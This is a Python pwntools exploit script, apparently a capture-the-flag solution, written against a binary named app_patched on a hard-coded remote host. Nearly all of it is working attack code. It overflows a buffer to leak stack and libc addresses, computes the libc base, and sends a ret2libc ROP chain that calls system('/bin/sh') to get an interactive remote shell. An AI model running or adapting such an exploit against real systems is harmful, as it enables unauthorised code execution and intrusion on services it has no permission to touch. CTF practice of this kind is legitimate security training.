#!/usr/bin/env python3

from pwn import *
import time
exe = ELF("./app_patched")
libc = ELF("./libc.so.6")
# ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process(["python3","guard.py"])
        # r = process(["./app_patched"])
        if args.GDB:
            gdb.attach(r,"""
                b * mitm_attack + 146
               c
               """)
    else:
        r = remote("104.155.74.49", 8085)

    return r

set_environ_payload = "A" * 64 + "\x58"

def main():
    r = conn()
    r.recvuntil(":")
    r.sendline("😊" * 25 + "ABCD" )

    log.info("Loading error per line into debug string")
    r.sendlineafter("Your choice:", "1")
    r.sendlineafter("rewards:", "any")

    log.info("Overriding the last byte with the environ offset")
    r.sendlineafter("Your choice:", "3")
    r.sendlineafter("debugging purposes:", set_environ_payload)

    log.info("Getting the stack environ leak")

    stack_environ_leak = int(r.recvuntil("!!").split(b": ")[1].split(b" !!")[0][::-1].hex(), 16)
    log.info("Stack environ leak " + hex(stack_environ_leak))
    stack_libc_leak = stack_environ_leak - 144
    log.info("stack libc leak: " + hex(stack_libc_leak))

    log.info("Sending the stack address that hold libc address to get the libc leak")
    r.sendlineafter("gift", "any")
    r.sendlineafter("Your choice:", "3")
    r.sendlineafter("debugging purposes:", b"B" * 64 + p64(stack_libc_leak))
    libc_leak = int(r.recvuntil("!!").split(b": ")[1].split(b" !!")[0][::-1].hex(), 16)

    log.info("libc leak: " + hex(libc_leak))
    libc.address = libc_leak - 0x2a28b
    log.info("libc base: " + hex(libc.address))
    log.info("Doing ret2libc")
    libc_rop = ROP(libc)

    libc_payload = flat(
        "\x90" * 56,
        p64(libc_rop.find_gadget(["pop rdi"])[0]),

        p64(next(libc.search("/bin/sh\0"))),
        p64(libc.symbols["system"]),
        p64(libc.symbols["system"])
    )

    r.sendlineafter("gift", libc_payload)

    r.interactive()


if __name__ == "__main__":
    main()